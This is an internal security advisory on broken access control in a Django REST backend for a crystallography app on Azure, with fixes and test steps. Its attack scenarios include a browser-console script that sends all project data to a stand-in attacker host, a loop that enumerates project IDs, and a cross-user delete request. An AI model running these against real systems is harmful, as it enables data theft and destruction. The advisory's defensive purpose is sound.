# CRITICAL Security Vulnerabilities - IMMEDIATE ACTION REQUIRED

## Executive Summary

**SEVERITY: CRITICAL (CVSS 9.1 - Authentication Bypass)**

Your application currently has **NO authorization** on Projects, Jobs, and ProjectGroups APIs. Any user who can authenticate to your Azure AD tenant can:
- View all projects created by all users
- Modify/delete any project or job
- Execute browser console attacks without logging into the UI

## Confirmed Vulnerabilities

### 🚨 CRITICAL: No Multi-Tenancy / Authorization

**Location:** All ViewSets in `server/ccp4i2/api/`
- `ProjectViewSet.py` - All endpoints use `permission_classes=[]`
- `JobViewSet.py` - All endpoints use `permission_classes=[]`
- `ProjectGroupViewSet.py` - All endpoints use `permission_classes=[]`

**Impact:**
```python
# Current behavior - ANY authenticated user can:
GET  /api/ccp4i2/projects/           # See ALL projects from ALL users
GET  /api/ccp4i2/projects/123/       # View any specific project
POST /api/ccp4i2/projects/123/jobs/  # Create jobs in anyone's project
DELETE /api/ccp4i2/projects/123/     # Delete anyone's project
```

**Attack Scenarios:**

#### Scenario 1: Console-Based Data Exfiltration
```javascript
// Attacker is authenticated (valid tenant user, valid token for your app)
// Opens browser console on ANY page (even app-selector)
// Runs this to steal all data:

fetch('https://ccp4i2-bicep-web.azurecontainerapps.io/api/ccp4i2/projects/', {
  headers: { 'Authorization': 'Bearer ' + await getValidToken() }
})
.then(r => r.json())
.then(projects => {
  // Exfiltrate all project data
  projects.forEach(p => {
    fetch(`https://attacker.com/steal?project=${p.id}&data=${JSON.stringify(p)}`);
  });
});
```

#### Scenario 2: Cross-User Data Corruption
```javascript
// User A creates a project (ID=123)
// User B (different person, but in same tenant) can delete it:

fetch('https://ccp4i2-bicep-web.azurecontainerapps.io/api/ccp4i2/projects/123/', {
  method: 'DELETE',
  headers: { 'Authorization': 'Bearer ' + await getValidToken() }
});

// User A's work is gone!
```

#### Scenario 3: Data Mining
```javascript
// Attacker is a legitimate tenant user (e.g., competitor in same university)
// Can enumerate all research projects:

for (let id = 1; id < 10000; id++) {
  fetch(`/api/ccp4i2/projects/${id}/`)
    .then(r => r.json())
    .then(data => {
      if (data.protein_name.includes('cancer')) {
        // Found competitor's cancer research project
        // Extract methods, structures, unpublished data
      }
    });
}
```

### Current Security Posture

| Layer | What It Checks | What It DOESN'T Check |
|-------|----------------|----------------------|
| Next.js Proxy | Token exists | Token validity, permissions |
| Django Middleware | ✓ Token signature<br>✓ Expiration<br>✓ Audience (app ID)<br>✓ Issuer (tenant) | ✗ Teams membership<br>✗ App roles<br>✗ Project ownership |
| DRF ViewSets | Nothing (`permission_classes=[]`) | ✗ Everything |

**Result:** Anyone in your Azure AD tenant with a valid token for your app can access/modify all data.

## What Authorization Exists (Frontend Only - INSECURE)

You **DO have Teams-based authorization** via `require-auth.tsx` and `teams-auth.ts` - but it's **ONLY on the frontend**!

**What works:**
✓ **Frontend checks Teams membership** - `require-auth.tsx` validates via Microsoft Graph API
✓ **Blocks UI access** - Non-members see "Access Denied" page
✓ **Checks "Newcastle Drug Discovery Unit" team** - Specific team ID validation

**What's missing (CRITICAL):**
❌ **Backend has NO Teams validation** - Django middleware never checks `groups` claim
❌ **Backend has NO app roles check** - `roles` claim not validated
❌ **Backend has NO project ownership** - No database foreign key to User
❌ **Backend has NO row-level security** - All queries return all rows

**Result:** Frontend authorization can be trivially bypassed via browser console or direct API calls.

## Protection Levels Required

### Level 1: Tenant-Level Protection (Current)
✓ **IMPLEMENTED** - Token must be for your tenant (`iss` claim validated)
- Blocks: External attackers, wrong tenant
- Doesn't block: Anyone in your tenant

### Level 2: App-Level Protection (Current)
✓ **IMPLEMENTED** - Token must be for your app (`aud` claim validated)
- Blocks: Tokens from other apps (even same tenant)
- Doesn't block: Anyone in your tenant who can get a token for your app

### Level 3: Teams/Roles Protection (MISSING)
❌ **NOT IMPLEMENTED** - Token must have specific `groups` or `roles` claims
- Would block: Tenant users not in approved Teams
- Azure AD must be configured to emit `groups` claim

### Level 4: Project Ownership (MISSING)
❌ **NOT IMPLEMENTED** - Projects must belong to the requesting user
- Would block: Users accessing other users' projects
- Requires database schema change

## Recommended Solutions

### Option 1: Teams-Based Authorization (Medium Effort) - HIGHEST PRIORITY

**Best for:** Organizations where you want to limit access to specific Teams.

**Your frontend already does this!** You just need to add it to the backend.

**Steps:**

See detailed implementation in: [SECURITY_FIX_TEAMS_BACKEND.md](../SECURITY_FIX_TEAMS_BACKEND.md)

**Quick Summary:**

1. **Configure Azure AD App to emit `groups` claim:**
   - Azure Portal → App Registrations → Your App → Token Configuration
   - Add optional claim: `groups` (as security groups)
   - Requires Azure AD Premium P1/P2

2. **Update `azure_auth.py` to validate groups:**

```python
# In process_token() method, after line 340 (after: request.azure_ad_user_id = azure_ad_sub)

# Extract groups claim from validated JWT
ALLOWED_AZURE_AD_GROUPS = os.environ.get("ALLOWED_AZURE_AD_GROUPS", "").split(",")
user_groups = claims.get("groups", [])

if ALLOWED_AZURE_AD_GROUPS and ALLOWED_AZURE_AD_GROUPS[0]:
    has_access = any(group_id in ALLOWED_AZURE_AD_GROUPS for group_id in user_groups)

    if not has_access:
        logger.warning(f"Access denied for {azure_ad_sub[:8]}. Not in authorized groups.")
        return JsonResponse(
            {
                "success": False,
                "error": "Access denied: You are not a member of an authorized group. "
                         "Please contact your administrator to request access to the "
                         "Newcastle Drug Discovery Unit team.",
            },
            status=403
        )
```

3. **Add to `.env.deployment`:**
```bash
# Your Teams group ID (from frontend code: 6f35cbeb-5f5d-4cf3-9b93-fe0b6eb6306d)
ALLOWED_AZURE_AD_GROUPS=6f35cbeb-5f5d-4cf3-9b93-fe0b6eb6306d
```

**Pros:**
- ✓ Matches your existing frontend logic
- ✓ Simple to implement (just backend validation)
- ✓ Centralized in Azure AD
- ✓ Team membership managed via Teams UI
- ✓ Closes the console bypass vulnerability

**Cons:**
- Still no per-project isolation (all approved users see all projects)
- Requires Azure AD Premium P1 for group claims (you likely already have this)

### Option 2: Project Ownership (High Effort, Best Security)

**Best for:** Multi-user environments where each user should only see their own projects.

**Steps:**

1. **Add `owner` field to Project model:**

```python
# In server/ccp4i2/models.py or wherever Project is defined
class Project(models.Model):
    # ... existing fields ...
    owner = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        on_delete=models.CASCADE,
        related_name='owned_projects',
        null=True,  # For backwards compatibility with existing data
        blank=True
    )
    shared_with = models.ManyToManyField(
        settings.AUTH_USER_MODEL,
        related_name='shared_projects',
        blank=True
    )
```

2. **Create migration:**
```bash
cd server
ccp4-python manage.py makemigrations
ccp4-python manage.py migrate
```

3. **Create permission class:**

```python
# server/ccp4i2/permissions.py (new file)
from rest_framework import permissions

class IsProjectOwnerOrShared(permissions.BasePermission):
    """
    Only allow access to projects owned by the user or shared with them.
    """
    def has_object_permission(self, request, view, obj):
        # Platform admins can access all projects
        if hasattr(request.user, 'is_platform_admin') and request.user.is_platform_admin:
            return True

        # Owner has full access
        if obj.owner == request.user:
            return True

        # Shared users have read-only access
        if request.method in permissions.SAFE_METHODS:
            return obj.shared_with.filter(id=request.user.id).exists()

        return False
```

4. **Update ProjectViewSet:**

```python
# server/ccp4i2/api/ProjectViewSet.py
from ..permissions import IsProjectOwnerOrShared

class ProjectViewSet(viewsets.ModelViewSet):
    permission_classes = [IsAuthenticated, IsProjectOwnerOrShared]

    def get_queryset(self):
        """Only return projects owned by or shared with the user."""
        user = self.request.user

        # Platform admins see all
        if hasattr(user, 'is_platform_admin') and user.is_platform_admin:
            return Project.objects.all()

        # Regular users see owned + shared
        return Project.objects.filter(
            models.Q(owner=user) | models.Q(shared_with=user)
        ).distinct()

    def perform_create(self, serializer):
        """Set owner when creating a project."""
        serializer.save(owner=self.request.user)

    # Change ALL action decorators from permission_classes=[] to:
    @action(detail=True, methods=["get"], permission_classes=[IsAuthenticated, IsProjectOwnerOrShared])
    def some_action(self, request, pk=None):
        # ... existing code ...
```

5. **Repeat for JobViewSet, ProjectGroupViewSet, etc.**

**Pros:**
- True multi-tenancy
- Each user only sees their own data
- Supports sharing mechanism
- Industry-standard security model

**Cons:**
- Requires database migration
- Need to backfill `owner` for existing projects
- More code changes across all ViewSets

### Option 3: Hybrid (Teams + Ownership)

Combine both approaches:
1. Teams membership = who can access the app at all
2. Project ownership = who can see which projects

**Best for:** Organizations with multiple teams, each needing isolated data.

## IMMEDIATE MITIGATION (DO THIS NOW)

While you decide on the long-term solution, **immediately add this** to all ViewSets:

```python
# server/ccp4i2/api/ProjectViewSet.py
# server/ccp4i2/api/JobViewSet.py
# server/ccp4i2/api/ProjectGroupViewSet.py

class ProjectViewSet(viewsets.ModelViewSet):
    # Change this:
    # permission_classes = []

    # To this:
    permission_classes = [IsAuthenticated]

    # And change ALL @action decorators:
    @action(detail=True, methods=["get"], permission_classes=[IsAuthenticated])  # was: []
    def some_action(self, request, pk=None):
        # ... existing code ...
```

This ensures:
- ✓ User must have valid JWT token
- ✓ Blocks unauthenticated console attacks
- ✗ Still allows any authenticated tenant user to access all data (but better than nothing)

## CORS and Console Attack Prevention

**Important:** CORS does NOT prevent console attacks!

```javascript
// This BYPASSES CORS because the request is same-origin:
// User is on your-app.azurecontainerapps.io/app-selector
// Fetch goes to your-app.azurecontainerapps.io/api/...
// Browser sees this as same-origin, allows it!
```

**Only authorization checks prevent console attacks**, not CORS.

## Testing Attack Vectors

### Test 1: Unauthenticated Console Attack (Should Fail)
```javascript
// On your app page, open console:
fetch('/api/ccp4i2/projects/')
  .then(r => r.json())
  .then(console.log);

// Expected: 401 Unauthorized (after fixing)
// Current: 200 OK with all projects (VULNERABLE!)
```

### Test 2: Authenticated Cross-User Access (Should Fail)
```javascript
// User A logs in, creates project ID=123
// User B logs in with DIFFERENT account
// User B opens console:

fetch('/api/ccp4i2/projects/123/')
  .then(r => r.json())
  .then(console.log);

// Expected: 403 Forbidden or 404 Not Found (after ownership fix)
// Current: 200 OK with User A's project data (VULNERABLE!)
```

### Test 3: Token from Another App (Should Fail - Already Works)
```javascript
// Get token for different app (different client_id)
// Try to use it:

fetch('/api/ccp4i2/projects/', {
  headers: { 'Authorization': 'Bearer ' + otherAppToken }
})

// Expected: 401 Invalid audience
// Current: 401 Invalid audience ✓ (PROTECTED)
```

## Action Plan

### Phase 1: Emergency Mitigation (1 hour)
1. Add `permission_classes = [IsAuthenticated]` to all ViewSets
2. Change all `@action` decorators from `permission_classes=[]` to `permission_classes=[IsAuthenticated]`
3. Deploy immediately
4. Test console attacks fail

### Phase 2: Choose Authorization Strategy (1 week)
Decision needed:
- Option 1: Teams-based (if you just want gate-keeping)
- Option 2: Project ownership (if you want true multi-tenancy)
- Option 3: Hybrid (both)

### Phase 3: Implement Chosen Strategy (2-4 weeks)
- Implement selected option
- Add migration for database changes (if Option 2/3)
- Update all ViewSets and permissions
- Add unit tests for authorization
- Deploy and verify

### Phase 4: Security Audit (Ongoing)
- Add authorization tests to CI/CD
- Monitor for authorization failures in logs
- Regular penetration testing
- Consider security scanning (e.g., OWASP ZAP)

## Questions to Answer

1. **Who should be able to access the app at all?**
   - Everyone in your tenant? → No Teams check needed
   - Only specific Teams? → Implement Option 1
   - Only invited users? → Implement Option 2 + invitation system

2. **Should users see each other's projects?**
   - Yes (collaborative environment) → Option 1 sufficient
   - No (isolated users) → Must implement Option 2

3. **Are there existing projects in production?**
   - Yes → Need migration strategy to backfill `owner` field
   - No → Clean implementation of Option 2

4. **Azure AD licensing?**
   - Premium P1/P2? → Can use group claims
   - Free tier? → Use App Roles instead (also requires admin consent)

## References

- [Microsoft Identity Platform - Authorization](https://learn.microsoft.com/en-us/azure/active-directory/develop/authorization-basics)
- [Django REST Framework - Permissions](https://www.django-rest-framework.org/api-guide/permissions/)
- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
